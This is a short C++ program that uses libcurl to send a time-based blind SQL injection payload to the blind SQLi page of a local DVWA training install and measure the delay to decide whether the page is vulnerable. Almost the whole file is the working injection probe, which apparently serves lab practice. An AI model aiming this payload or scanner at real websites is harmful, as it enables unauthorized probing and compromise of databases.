#include <iostream>
#include <string>
#include <fstream>
#include <vector>
#include <curl/curl.h>
#include <sstream>
#include <chrono>
// Callback function to store response data
size_t WriteCallback(char *ptr, size_t size, size_t nmemb, std::string *userdata)
{
    size_t len = size * nmemb;
    userdata->append(ptr, len);
    return len;
}

int main()
{
    CURL *curl = curl_easy_init();
    if (!curl)
    {
        std::cerr << "Failed to initialize curl\n";
        return 1;
    }
    int testingtime=25;
    std::string payload="'XOR(if(now()=sysdate(),sleep("+std::to_string(testingtime)+"),0))OR'";
    std::string fixedpayload="&Submit=Submit";
    std::string successmessage="exists";
    std::string errormessage="MISSING";
    bool vulnerable=false;

    std::string response;

    std::string url = "http://localhost/DVWA-master/vulnerabilities/sqli_blind/?id=" +payload+fixedpayload;
    std::cout << url <<"\n";

    curl_easy_setopt(curl, CURLOPT_HTTPGET, 1L);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

    curl_easy_setopt(curl, CURLOPT_HEADERDATA, NULL);
    curl_easy_setopt(curl, CURLOPT_HEADER, 1);
    auto start_time= std::chrono::high_resolution_clock::now();
    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    CURLcode res = curl_easy_perform(curl);
    auto end_time= std::chrono::high_resolution_clock::now();
    auto duration= std::chrono::duration_cast<std::chrono::milliseconds>(end_time-start_time);
    long long int time=duration.count();
    std::cout <<"Time taken: "<<time<<"miliseconds"<< std::endl;
    if (res != CURLE_OK)
    {
        std::cerr << "Failed to perform curl request: " << curl_easy_strerror(res) << "\n";
        curl_easy_cleanup(curl);
        return 1;
    }

    if (response.empty())
    {
        std::cerr << "Empty response data\n";
    }

    //std::cout << "Response: " << response << "\n";
    if(time<=(testingtime+1)*1000L&&time>=(testingtime-1)*1000L)
    {
        vulnerable=true;
    }



    curl_easy_cleanup(curl);
    if(vulnerable)
    {
        std::cout << "The website is vulnerable to Timebased SQL injection\n";
    }
    else std::cout << "The website is not vulnerable.Sorry we can not do any further work\n";


   return 0;
}


